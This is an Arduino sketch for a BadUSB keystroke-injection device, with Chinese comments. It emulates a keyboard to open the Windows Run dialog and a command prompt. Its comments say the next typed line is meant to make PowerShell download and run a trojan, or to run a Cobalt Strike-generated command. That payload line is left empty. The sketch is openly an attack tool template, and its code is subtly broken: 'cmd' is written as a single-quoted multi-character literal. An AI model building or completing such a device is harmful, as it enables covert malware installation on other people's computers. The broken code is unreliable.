#include <Keyboard.h>

void setup() {
Keyboard.begin();   //开始键盘通讯
delay(1000);
Keyboard.press(KEY_LEFT_GUI);   //点击win键
delay(300);
Keyboard.press('r');  //点击r键
delay(300);
Keyboard.release(KEY_LEFT_GUI);   //松开win键
delay(300);
Keyboard.release('r');   //松开r键
delay(300); 
Keyboard.press(KEY_CAPS_LOCK);  //开启大写锁绕开输入法
delay(300);
Keyboard.release(KEY_CAPS_LOCK);  //松开大写锁
delay(300);
Keyboard.println('cmd');  //打开CMD
delay(300);
Keyboard.press(KEY_RETURN);  //按下回车键执行
delay(300);
Keyboard.release(KEY_RETURN);  //松开回车键
delay(300);
Keyboard.println('');  //打开powershell并访问网址下载并执行木马，这里也可以用CobaltStrike生成的命令替代并分多次输入
delay(300);
Keyboard.press(KEY_RETURN);  //按下回车键
delay(300);
Keyboard.release(KEY_RETURN);  //松开回车键
delay(900);
Keyboard.end();  //结束键盘通讯
}

void loop() {
//循环语句

}
